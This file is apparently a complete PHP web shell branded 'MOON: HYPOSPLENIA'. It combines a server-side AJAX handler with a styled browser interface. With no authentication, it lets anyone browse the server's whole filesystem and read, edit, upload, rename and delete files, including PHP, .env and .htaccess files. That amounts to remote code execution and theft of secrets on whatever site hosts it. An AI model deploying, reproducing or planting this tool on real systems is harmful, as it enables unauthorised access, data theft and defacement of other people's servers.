<?php
// AJAX API Handler
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax_action'])) {
    header('Content-Type: application/json');
    
    $response = ['success' => false, 'message' => 'Unknown action'];
    
    $currentDir = isset($_POST['dir']) && !empty($_POST['dir']) 
        ? realpath($_POST['dir']) 
        : (isset($_POST['current_dir']) ? realpath($_POST['current_dir']) : getcwd());
    
    if (!$currentDir) $currentDir = getcwd();
    
    switch ($_POST['ajax_action']) {
        case 'list':
            $response = ajaxListDirectory($currentDir);
            break;
        case 'upload':
            $response = ajaxUpload($currentDir);
            break;
        case 'delete':
            $response = ajaxDelete($currentDir, $_POST['name'] ?? '');
            break;
        case 'rename':
            $response = ajaxRename($currentDir, $_POST['old_name'] ?? '', $_POST['new_name'] ?? '');
            break;
        case 'mkdir':
            $response = ajaxMkdir($currentDir, $_POST['name'] ?? '');
            break;
        case 'read':
            $response = ajaxReadFile($currentDir, $_POST['name'] ?? '');
            break;
        case 'save':
            $response = ajaxSaveFile($currentDir, $_POST['name'] ?? '', $_POST['content'] ?? '');
            break;
    }
    
    echo json_encode($response);
    exit;
}

function ajaxListDirectory($dir) {
    if (!is_dir($dir)) {
        return ['success' => false, 'message' => 'Invalid directory: ' . $dir];
    }
    
    $items = [];
    $dh = opendir($dir);
    if ($dh) {
        while (($file = readdir($dh)) !== false) {
            if ($file === '.' || $file === '..') continue;
            $path = $dir . DIRECTORY_SEPARATOR . $file;
            $items[] = [
                'name' => $file,
                'type' => is_dir($path) ? 'dir' : 'file',
                'size' => is_file($path) ? filesize($path) : 0,
                'date' => date('Y-m-d H:i', filemtime($path))
            ];
        }
        closedir($dh);
    }
    
    usort($items, function($a, $b) {
        if ($a['type'] === $b['type']) {
            return strcasecmp($a['name'], $b['name']);
        }
        return $a['type'] === 'dir' ? -1 : 1;
    });
    
    return [
        'success' => true,
        'current_dir' => $dir,
        'parent_dir' => dirname($dir),
        'items' => $items
    ];
}

function ajaxUpload($dir) {
    if (!isset($_POST['filename'], $_POST['data'], $_POST['target'])) {
        return ['success' => false, 'message' => 'Invalid upload data'];
    }

    $filename = basename($_POST['filename']);

    // decode target (like elFinder hash)
    $decoded = base64_decode($_POST['target'], true);
    if ($decoded === false || !is_dir($decoded)) {
        return ['success' => false, 'message' => 'Invalid target'];
    }

    $targetDir = realpath($decoded);
    if (!$targetDir) {
        return ['success' => false, 'message' => 'Path error'];
    }

    // decode base64 file
    $data = base64_decode($_POST['data'], true);
    if ($data === false) {
        return ['success' => false, 'message' => 'Base64 decode failed'];
    }

    $targetFile = $targetDir . DIRECTORY_SEPARATOR . $filename;

    if (file_put_contents($targetFile, $data) !== false) {
        return [
            'success' => true,
            'message' => 'Upload complete',
            'file' => [
                'name' => $filename,
                'hash' => base64_encode($targetFile),
                'size' => filesize($targetFile)
            ]
        ];
    }

    return ['success' => false, 'message' => 'Failed to save file'];
}

function ajaxDelete($dir, $name) {
    if (empty($name)) return ['success' => false, 'message' => 'No name provided'];
    $path = $dir . DIRECTORY_SEPARATOR . $name;
    
    if (!file_exists($path)) {
        return ['success' => false, 'message' => 'File not found'];
    }
    
    $success = is_dir($path) ? rmdir($path) : unlink($path);
    return ['success' => $success, 'message' => $success ? 'Deleted' : 'Delete failed'];
}

function ajaxRename($dir, $old, $new) {
    if (empty($old) || empty($new)) {
        return ['success' => false, 'message' => 'Names required'];
    }
    
    $oldPath = $dir . DIRECTORY_SEPARATOR . $old;
    $newPath = $dir . DIRECTORY_SEPARATOR . $new;
    
    if (!file_exists($oldPath)) {
        return ['success' => false, 'message' => 'Source not found'];
    }
    
    $success = rename($oldPath, $newPath);
    return ['success' => $success, 'message' => $success ? 'Renamed' : 'Rename failed'];
}

function ajaxMkdir($dir, $name) {
    if (empty($name)) return ['success' => false, 'message' => 'Name required'];
    $newDir = $dir . DIRECTORY_SEPARATOR . $name;
    
    if (file_exists($newDir)) {
        return ['success' => false, 'message' => 'Already exists'];
    }
    
    $success = mkdir($newDir, 0755);
    return ['success' => $success, 'message' => $success ? 'Created' : 'Failed'];
}

function ajaxReadFile($dir, $name) {
    if (empty($name)) return ['success' => false, 'message' => 'Name required'];
    $path = $dir . DIRECTORY_SEPARATOR . $name;
    
    if (!is_file($path) || !is_readable($path)) {
        return ['success' => false, 'message' => 'Cannot read file'];
    }
    
    $content = file_get_contents($path);
    return [
        'success' => true,
        'content' => $content,
        'name' => $name
    ];
}

function ajaxSaveFile($dir, $name, $content) {
    if (empty($name)) return ['success' => false, 'message' => 'Name required'];
    $path = $dir . DIRECTORY_SEPARATOR . $name;
    
    $success = file_put_contents($path, $content) !== false;
    return ['success' => $success, 'message' => $success ? 'Saved' : 'Failed'];
}

$currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$currentDir) $currentDir = getcwd();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>"Moon, tell me if I could"</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 50%, #16213e 100%);
            color: #e0e0e0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            position: relative;
        }
        
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-image: 
                radial-gradient(2px 2px at 20px 30px, rgba(255,255,255,0.8), transparent),
                radial-gradient(2px 2px at 40px 70px, rgba(255,255,255,0.6), transparent);
            background-size: 200px 200px;
            animation: twinkle 8s ease-in-out infinite;
            opacity: 0.3;
            pointer-events: none;
            z-index: 0;
        }
        
        @keyframes twinkle { 0%, 100% { opacity: 0.3; } 50% { opacity: 0.5; } }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }
        
        header {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 16px;
            padding: 25px;
            margin-bottom: 20px;
        }
        
        .header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .logo-icon {
            font-size: 40px;
            animation: float 3s ease-in-out infinite;
            cursor: pointer;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }
        
        h1 {
            font-weight: 300;
            letter-spacing: 3px;
            background: linear-gradient(to right, #c0c0c0, #fff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .path-bar {
            background: rgba(0,0,0,0.3);
            padding: 10px 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            color: #64ffda;
            font-size: 13px;
            word-break: break-all;
        }
        
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(255,255,255,0.1);
            color: #e0e0e0;
            border: 1px solid rgba(255,255,255,0.2);
        }
        
        .btn:hover {
            background: rgba(255,255,255,0.2);
            transform: translateY(-2px);
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
            border: none;
        }
        
        .toolbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .file-list {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 16px;
            overflow: hidden;
            min-height: 200px;
        }
        
        .file-item {
            display: flex;
            align-items: center;
            padding: 15px 25px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            transition: all 0.3s;
            gap: 15px;
        }
        
        .file-item:hover {
            background: rgba(255,255,255,0.05);
            border-left: 3px solid #64ffda;
        }
        
        .file-icon { font-size: 24px; width: 40px; text-align: center; }
        
        .file-name {
            flex: 1;
            color: #ccd6f6;
            cursor: pointer;
            user-select: none;
        }
        
        .file-name:hover { color: #64ffda; }
        .file-name.dir { color: #90a0d9; font-weight: 600; }
        
        .file-meta {
            color: #8892b0;
            font-size: 12px;
            display: flex;
            gap: 20px;
            min-width: 180px;
        }
        
        .file-actions {
            display: flex;
            gap: 6px;
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        .file-item:hover .file-actions { opacity: 1; }
        
        .btn-small {
            padding: 6px 12px;
            font-size: 11px;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        
        .modal.active { display: flex; }
        
        .modal-content {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 16px;
            padding: 30px;
            width: 90%;
            max-width: 500px;
            position: relative;
        }
        
        .modal-close {
            position: absolute;
            top: 15px; right: 20px;
            background: none;
            border: none;
            color: #8892b0;
            font-size: 24px;
            cursor: pointer;
        }
        
        .form-group { margin: 20px 0; }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #8892b0;
            font-size: 13px;
        }
        
        .form-group input,
        .form-group textarea {
            width: 100%;
            padding: 12px;
            background: rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 8px;
            color: #e0e0e0;
            font-family: inherit;
        }
        
        .form-group textarea {
            min-height: 300px;
            font-family: 'Courier New', monospace;
        }
        
        .dropzone {
            border: 2px dashed rgba(100,255,218,0.3);
            border-radius: 12px;
            padding: 40px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .dropzone:hover, .dropzone.dragover {
            border-color: #64ffda;
            background: rgba(100,255,218,0.05);
        }
        
        .notification-container {
            position: fixed;
            top: 20px; right: 20px;
            z-index: 2000;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .notification {
            background: rgba(20,20,35,0.95);
            border-left: 4px solid #64ffda;
            border-radius: 8px;
            padding: 15px 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
            animation: slideIn 0.3s ease-out;
            min-width: 300px;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .notification.error { border-left-color: #ff416c; }
        
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 1500;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        
        .loading-overlay.active { display: flex; }
        
        .spinner {
            width: 50px; height: 50px;
            border: 3px solid rgba(255,255,255,0.1);
            border-top-color: #64ffda;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .empty-state {
            text-align: center;
            padding: 60px;
            color: #8892b0;
        }
        
        .shortcut-hint {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0,0,0,0.6);
            padding: 10px 15px;
            border-radius: 8px;
            font-size: 12px;
            color: #8892b0;
            border: 1px solid rgba(255,255,255,0.1);
        }
    </style>
</head>
<body>
    <div class="notification-container" id="notifications"></div>
    
    <div class="loading-overlay" id="loading">
        <div class="spinner"></div>
        <p style="margin-top: 15px; color: #64ffda;">Loading...</p>
    </div>

    <div class="container">
        <header>
            <div class="header-top">
                <div class="logo">
                    <span class="logo-icon" onclick="app.goHome()">🌙</span>
                    <h1>MOON: HYPOSPLENIA</h1>
                </div>
                <div>
                    <button class="btn" onclick="app.showUpload()">📤 Upload</button>
                    <button class="btn" onclick="app.showMkdir()">📁 New Folder</button>
                    <button class="btn" onclick="app.refresh()">🔄 Refresh</button>
                </div>
            </div>
            <div class="path-bar" id="currentPath"><?php echo htmlspecialchars($currentDir); ?></div>
        </header>

        <div class="toolbar">
            <button class="btn" onclick="app.goUp()" style="color: #64ffda;">⬆ GO UP</button>
            <input type="text" id="searchBox" placeholder="🔍 Search..." 
                   style="padding: 8px 15px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: #e0e0e0;"
                   onkeyup="app.search(this.value)">
        </div>

        <div class="file-list" id="fileList">
            <div class="empty-state">Loading...</div>
        </div>
    </div>

    <div class="shortcut-hint">
        HYPOSPLENIA - 2026
    </div>

    <!-- Modals -->
    <div class="modal" id="uploadModal">
        <div class="modal-content">
            <button class="modal-close" onclick="app.closeModal('uploadModal')">&times;</button>
            <h2>📤 Upload File</h2>
            <div class="dropzone" id="dropzone" onclick="document.getElementById('fileInput').click()">
                <p>Click or drop files here</p>
                <input type="file" id="fileInput" style="display: none;" onchange="app.handleFileSelect(this)">
            </div>
        </div>
    </div>

    <div class="modal" id="mkdirModal">
        <div class="modal-content">
            <button class="modal-close" onclick="app.closeModal('mkdirModal')">&times;</button>
            <h2>📁 New Folder</h2>
            <div class="form-group">
                <label>Folder Name</label>
                <input type="text" id="mkdirName" placeholder="Enter name...">
            </div>
            <button class="btn btn-primary" onclick="app.doMkdir()">Create</button>
        </div>
    </div>

    <div class="modal" id="renameModal">
        <div class="modal-content">
            <button class="modal-close" onclick="app.closeModal('renameModal')">&times;</button>
            <h2>✏️ Rename</h2>
            <div class="form-group">
                <label>New Name</label>
                <input type="text" id="renameName" placeholder="Enter new name...">
            </div>
            <button class="btn btn-primary" onclick="app.doRename()">Rename</button>
        </div>
    </div>

    <div class="modal" id="editModal">
        <div class="modal-content" style="max-width: 800px;">
            <button class="modal-close" onclick="app.closeModal('editModal')">&times;</button>
            <h2>📝 Edit: <span id="editTitle"></span></h2>
            <div class="form-group">
                <textarea id="editContent"></textarea>
            </div>
            <button class="btn btn-primary" onclick="app.doSave()">💾 Save</button>
        </div>
    </div>

    <script>
        const app = {
            currentDir: <?php echo json_encode($currentDir); ?>,
            items: [],
            renameTarget: null,
            editTarget: null,
            
            editableExts: ['txt', 'html', 'htm', 'php', 'css', 'js', 'json', 'xml', 'md', 'sql', 'ini', 'conf', 'htaccess', 'log', 'py', 'rb', 'java', 'c', 'cpp', 'h', 'cs', 'go', 'rs', 'swift', 'kt', 'ts', 'jsx', 'tsx', 'vue', 'scss', 'sass', 'less', 'yaml', 'yml', 'env', 'gitignore', 'bat', 'sh', 'ps1'],
            
            init() {
                this.load(this.currentDir);
                this.setupDropzone();
                this.setupFileListEvents();
            },
            
            setupFileListEvents() {
                const fileList = document.getElementById('fileList');
                
                fileList.addEventListener('click', (e) => {
                    // Find the closest file-item ancestor
                    const fileItem = e.target.closest('.file-item');
                    if (!fileItem) return;
                    
                    const name = fileItem.dataset.name;
                    const type = fileItem.dataset.type;
                    
                    // Check if clicking on the file-name element (not buttons)
                    if (e.target.classList.contains('file-name')) {
                        if (type === 'dir') {
                            // Handle directory click
                            if (e.ctrlKey) {
                                e.preventDefault();
                                e.stopPropagation();
                                this.openDirInNewTab(name);
                            } else {
                                this.openDir(name);
                            }
                        }
                        // Files don't have click action on name (only edit button)
                    }
                });
            },
            
            isEditable(filename) {
                const ext = filename.split('.').pop().toLowerCase();
                return this.editableExts.includes(ext);
            },
            
            async ajax(action, data = {}) {
                this.showLoading(true);
                
                const formData = new FormData();
                formData.append('ajax_action', action);
                formData.append('current_dir', this.currentDir);
                
                for (let key in data) {
                    formData.append(key, data[key]);
                }
                
                try {
                    const response = await fetch(<?php echo json_encode($_SERVER["PHP_SELF"]); ?>, {
                        method: 'POST',
                        body: formData
                    });
                    
                    const text = await response.text();
                    
                    let result;
                    try {
                        result = JSON.parse(text);
                    } catch (e) {
                        console.error('JSON parse error:', e, 'Raw:', text);
                        this.notify('Server error', 'error');
                        return { success: false };
                    }
                    
                    this.showLoading(false);
                    return result;
                } catch (err) {
                    this.showLoading(false);
                    this.notify('Network error: ' + err.message, 'error');
                    return { success: false };
                }
            },
            
            async load(dir) {
                const result = await this.ajax('list', { dir: dir });
                
                if (result.success) {
                    this.currentDir = result.current_dir;
                    this.items = result.items;
                    document.getElementById('currentPath').textContent = this.currentDir;
                    this.render();
                } else {
                    this.notify(result.message || 'Failed to load', 'error');
                }
            },
            
            render() {
                const container = document.getElementById('fileList');
                
                if (!this.items || this.items.length === 0) {
                    container.innerHTML = '<div class="empty-state">Empty directory</div>';
                    return;
                }
                
                let html = '';
                this.items.forEach(item => {
                    const isDir = item.type === 'dir';
                    const icon = isDir ? '📂' : this.getFileIcon(item.name);
                    const isEditable = !isDir && this.isEditable(item.name);
                    
                    // Store data attributes for event handling - NO inline onclick
                    const dataAttrs = `data-name="${this.escapeHtml(item.name)}" data-type="${item.type}"`;
                    
                    // Only show edit button for editable files
                    const editBtn = isEditable ? 
                        `<button class="btn btn-small" onclick="app.edit('${this.escapeJs(item.name)}')">📝 Edit</button>` : '';
                    
                    // Directory names get special class, files don't have click handler on name
                    const nameClass = isDir ? 'file-name dir' : 'file-name';
                    
                    html += `
                        <div class="file-item" ${dataAttrs}>
                            <span class="file-icon">${icon}</span>
                            <span class="${nameClass}">${this.escapeHtml(item.name)}</span>
                            <div class="file-meta">
                                <span>${item.date}</span>
                                <span>${isDir ? '-' : this.formatSize(item.size)}</span>
                            </div>
                            <div class="file-actions">
                                ${editBtn}
                                <button class="btn btn-small" onclick="app.rename('${this.escapeJs(item.name)}')">✏️ Rename</button>
                                <button class="btn btn-small btn-danger" onclick="app.delete('${this.escapeJs(item.name)}')">🗑️ Delete</button>
                            </div>
                        </div>
                    `;
                });
                
                container.innerHTML = html;
            },
            
            openDir(name) {
                const separator = this.currentDir.includes('\\') ? '\\' : '/';
                let newPath;
                
                if (this.currentDir.endsWith('\\') || this.currentDir.endsWith('/')) {
                    newPath = this.currentDir + name;
                } else {
                    newPath = this.currentDir + separator + name;
                }
                
                this.load(newPath);
            },
            
            openDirInNewTab(name) {
                const separator = this.currentDir.includes('\\') ? '\\' : '/';
                let newPath;
                
                if (this.currentDir.endsWith('\\') || this.currentDir.endsWith('/')) {
                    newPath = this.currentDir + name;
                } else {
                    newPath = this.currentDir + separator + name;
                }
                
                const url = new URL(window.location.href);
                url.searchParams.set('dir', newPath);
                
                window.open(url.toString(), '_blank');
                this.notify('Opened in new tab', 'success');
            },
            
            goUp() {
                const separator = this.currentDir.includes('\\') ? '\\' : '/';
                const parent = this.currentDir + separator + '..';
                this.load(parent);
            },
            
            goHome() {
                this.load(<?php echo json_encode($currentDir); ?>);
            },
            
            refresh() {
                this.load(this.currentDir);
            },
            
            async delete(name) {
                if (!confirm('Delete "' + name + '"?')) return;
                
                const result = await this.ajax('delete', { name });
                if (result.success) {
                    this.notify('Deleted', 'success');
                    this.refresh();
                } else {
                    this.notify(result.message, 'error');
                }
            },
            
            rename(name) {
                this.renameTarget = name;
                document.getElementById('renameName').value = name;
                this.showModal('renameModal');
            },
            
            async doRename() {
                const newName = document.getElementById('renameName').value.trim();
                if (!newName) return;
                
                const result = await this.ajax('rename', {
                    old_name: this.renameTarget,
                    new_name: newName
                });
                
                if (result.success) {
                    this.closeModal('renameModal');
                    this.notify('Renamed', 'success');
                    this.refresh();
                } else {
                    this.notify(result.message, 'error');
                }
            },
            
            async edit(name) {
                const result = await this.ajax('read', { name });
                if (result.success) {
                    this.editTarget = name;
                    document.getElementById('editTitle').textContent = name;
                    document.getElementById('editContent').value = result.content;
                    this.showModal('editModal');
                } else {
                    this.notify(result.message, 'error');
                }
            },
            
            async doSave() {
                const content = document.getElementById('editContent').value;
                const result = await this.ajax('save', {
                    name: this.editTarget,
                    content: content
                });
                
                if (result.success) {
                    this.closeModal('editModal');
                    this.notify('Saved', 'success');
                } else {
                    this.notify(result.message, 'error');
                }
            },
            
            showMkdir() {
                document.getElementById('mkdirName').value = '';
                this.showModal('mkdirModal');
            },
            
            async doMkdir() {
                const name = document.getElementById('mkdirName').value.trim();
                if (!name) return;
                
                const result = await this.ajax('mkdir', { name });
                if (result.success) {
                    this.closeModal('mkdirModal');
                    this.notify('Created', 'success');
                    this.refresh();
                } else {
                    this.notify(result.message, 'error');
                }
            },
            
            showUpload() {
                this.showModal('uploadModal');
            },
            
            handleFileSelect(input) {
                if (input.files.length > 0) {
                    this.uploadFile(input.files[0]);
                }
            },
            
            setupDropzone() {
                const dz = document.getElementById('dropzone');
                
                dz.addEventListener('dragover', e => {
                    e.preventDefault();
                    dz.classList.add('dragover');
                });
                
                dz.addEventListener('dragleave', () => {
                    dz.classList.remove('dragover');
                });
                
                dz.addEventListener('drop', e => {
                    e.preventDefault();
                    dz.classList.remove('dragover');
                    if (e.dataTransfer.files.length > 0) {
                        this.uploadFile(e.dataTransfer.files[0]);
                    }
                });
            },
            
async uploadFile(file) {
    this.closeModal('uploadModal');
    this.showLoading(true);

    try {
        const base64 = await this.blobToBase64(file);
        const clean = base64.split(',')[1];

        const formData = new FormData();
        formData.append('ajax_action', 'upload');
        formData.append('filename', file.name);
        formData.append('data', clean);

        formData.append('target', btoa(this.currentDir));

        const response = await fetch(window.location.href, {
            method: 'POST',
            body: formData
        });

        const result = await response.json();
        this.showLoading(false);

        if (result.success) {
            this.notify('Uploaded', 'success');
            this.refresh();
        } else {
            this.notify(result.message, 'error');
        }

    } catch (err) {
        this.showLoading(false);
        this.notify('Upload failed: ' + err.message, 'error');
    }
},

blobToBase64(blob) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result);
        reader.onerror = reject;
        reader.readAsDataURL(blob);
    });
},
            
            search(query) {
                if (!query) {
                    this.render();
                    return;
                }
                
                const filtered = this.items.filter(item => 
                    item.name.toLowerCase().includes(query.toLowerCase())
                );
                
                const original = this.items;
                this.items = filtered;
                this.render();
                this.items = original;
            },
            
            showModal(id) {
                document.getElementById(id).classList.add('active');
            },
            
            closeModal(id) {
                document.getElementById(id).classList.remove('active');
            },
            
            showLoading(show) {
                document.getElementById('loading').classList.toggle('active', show);
            },
            
            notify(msg, type = 'info') {
                const div = document.createElement('div');
                div.className = 'notification ' + type;
                div.innerHTML = '<strong>' + this.escapeHtml(msg) + '</strong>';
                document.getElementById('notifications').appendChild(div);
                
                setTimeout(() => {
                    div.style.opacity = '0';
                    setTimeout(() => div.remove(), 300);
                }, 3000);
            },
            
            getFileIcon(name) {
                const ext = name.split('.').pop().toLowerCase();
                const icons = {
                    php: '📄', html: '🌐', css: '🎨', js: '⚡',
                    json: '📋', txt: '📄', md: '📝', sql: '🗄️',
                    jpg: '🖼️', jpeg: '🖼️', png: '🖼️', gif: '🖼️',
                    zip: '📦', rar: '📦', pdf: '📕', doc: '📘',
                    docx: '📘', xls: '📗', xlsx: '📗', mp3: '🎵',
                    mp4: '🎬', exe: '⚙️', dll: '⚙️', bat: '📜',
                    sh: '📜', ps1: '📜', py: '🐍', rb: '💎',
                    java: '☕', c: '🔧', cpp: '🔧', h: '🔧',
                    cs: '🔷', go: '🐹', rs: '🦀', swift: '🦉',
                    kt: '🎯', ts: '📘', jsx: '⚛️', tsx: '⚛️',
                    vue: '🟢', scss: '🎨', sass: '🎨', less: '🎨',
                    yaml: '📋', yml: '📋', xml: '📋', ini: '⚙️',
                    conf: '⚙️', htaccess: '🔒', log: '📋', env: '🔐',
                    gitignore: '🔒'
                };
                return icons[ext] || '📄';
            },
            
            formatSize(bytes) {
                if (bytes === 0) return '0 B';
                const k = 1024;
                const sizes = ['B', 'KB', 'MB', 'GB'];
                const i = Math.floor(Math.log(bytes) / Math.log(k));
                return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
            },
            
            escapeHtml(text) {
                const div = document.createElement('div');
                div.textContent = text;
                return div.innerHTML;
            },
            
            escapeJs(str) {
                return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"');
            }
        };
        
        document.addEventListener('DOMContentLoaded', () => app.init());
        
        document.addEventListener('keydown', e => {
            if (e.key === 'Escape') {
                document.querySelectorAll('.modal').forEach(m => m.classList.remove('active'));
            }
        });
    </script>
</body>
</html>